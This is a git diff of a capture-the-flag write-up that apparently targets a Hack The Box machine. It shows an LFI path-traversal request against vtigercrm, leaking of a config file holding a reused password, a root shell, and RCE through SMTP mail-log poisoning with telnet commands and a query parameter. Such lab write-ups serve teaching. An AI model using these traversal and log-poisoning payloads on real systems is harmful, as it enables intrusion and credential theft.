@@ -130,7 +130,7 @@ aea082e5ae690372196d0ebee91146c8
 
 Unfortunately, we cannot obtain the root flag, as the hijacked user apparently does not have enough privileges.
 
-Doing more research on the LFI possibilities for this specific software, I stumbled accross this exploit here (https://www.exploit-db.com/exploits/37637). It basically says, we can leak a specific config file called `ampportal.conf`. It should contain passwords, usernames as well as any other setting of the software.
+Doing more research on the LFI possibilities for this specific software, I stumbled upon this exploit here (https://www.exploit-db.com/exploits/37637). It basically says, we can leak a specific config file called `/etc/amportal.conf`. It should contain passwords, usernames as well as any other setting of the software.
 
 And indeed! We can leak it and get tons of information.
 
@@ -138,7 +138,7 @@ And indeed! We can leak it and get tons of information.
 
 The ridiculous thing here is that they apparently use the same password `jEhdIekWmdjE` for every single user and sub-application like the mysql DB.
 
-Now let's try to login into the admin panel in `/admin`, which we could not access. This time it works (username= admin)!
+Now let's try to login into the admin panel in `/admin`, which we could not access previously. This time it works (username= admin)!
 
 ![](pics/admin_panel.png)
 
@@ -220,7 +220,7 @@ uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
 ```
 
 ### Local File Inclusion to Remote Code Execution
-When I read some other writeups, I was fascinated by the fact that there exist several ways to pwn the machine. Another way I stumpled upon exploited LFI. As I am a big fan of LFIs I also had to try this one.
+When I read some other writeups, I was fascinated by the fact that there exist several ways to pwn the machine. Another way I stumbled upon exploited LFI. As I am a big fan of LFIs I also had to try this one.
 
 
 So again we go back to our LFI vulnerability:
@@ -228,7 +228,7 @@ So again we go back to our LFI vulnerability:
 GET /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
 ```
 
-From the ennumeration part, we know that Port 25 (SMTP) is open. Let's use to send a mail to the user `asterisk`, which we leaked from the /etc/passwd file.
+From the ennumeration part, we know that Port 25 (SMTP) is open. Let's it to send a mail to the user `asterisk`, which we leaked from the /etc/passwd file.
 
 ```
 └──╼ $ telnet 10.129.1.226 25
@@ -263,13 +263,13 @@ quit
 Connection closed by foreign host.
 ```
 
-Afterwards we can check if the email was successfully sent:
+Afterwards we can check if the email was successfully sent and received:
 
 ```
 GET /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../var/mail/asterisk%00
 ```
 
-We can actually see the email that we just sent via SMTP:
+With the LFI, we can leak the email that we have just sent. This also means, that our PHP code now gets executed!
 
 ```
 From babbadeckl@pwn.com  Wed Jan 13 22:48:18 2021
@@ -286,7 +286,7 @@ From: babbadeckl@pwn.com
 To: undisclosed-recipients:;
 ```
 
-Now when we append our RCE parameter `babbadeckl`, we have RCE:
+Now when we append our malicious parameter `babbadeckl`, that we included in the injected PHP code, we have RCE:
 
 ```
 GET /vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../var/mail/asterisk%00&babbadeckl=id
